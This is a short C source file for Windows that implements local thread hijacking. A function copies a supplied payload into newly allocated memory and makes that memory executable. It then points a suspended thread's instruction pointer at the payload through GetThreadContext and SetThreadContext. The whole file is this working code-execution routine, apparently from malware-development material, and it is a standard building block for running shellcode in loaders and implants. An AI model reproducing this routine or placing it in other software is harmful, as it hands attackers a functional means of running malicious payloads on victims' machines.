/*
Thread Hijacking Function

RunViaClassicThreadHijacking is a custom-built function that performs thread hijacking. The function requires 3 arguments:

    hThread - A handle to a suspended thread to be hijacked.

    pPayload - A pointer to the payload's base address.

    sPayloadSize - The size of the payload.


*/

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	
	PVOID    pAddress         = NULL;
	DWORD    dwOldProtection  = NULL;
	CONTEXT  ThreadCtx        = { 
		.ContextFlags = CONTEXT_CONTROL 
	};

    // Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL){
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)){
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}